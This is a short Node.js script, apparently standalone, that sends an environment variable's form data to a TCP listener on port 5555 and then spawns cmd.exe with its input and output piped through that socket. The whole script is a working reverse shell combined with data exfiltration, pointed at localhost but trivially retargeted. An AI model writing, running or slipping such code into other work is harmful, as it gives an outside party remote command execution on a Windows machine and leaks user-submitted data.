const net = require('net');
const { spawn } = require('child_process');

const formData = process.env.FORM_DATA || '{}';
console.log('Form Data:', formData);

const client = new net.Socket();
client.connect(5555, '127.0.0.1', () => {
    console.log('Connected to listener');
    
    
    client.write('=== Form Data ===\n');
    client.write(formData + '\n');
    client.write('=================\n');
    
    const shell = spawn('cmd.exe', []);
    
    shell.stdout.on('data', (data) => {
        client.write(data);
    });
    
    shell.stderr.on('data', (data) => {
        client.write(data);
    });
    
    client.on('data', (data) => {
        shell.stdin.write(data);
    });
    
    client.on('close', () => {
        shell.kill();
    });
});
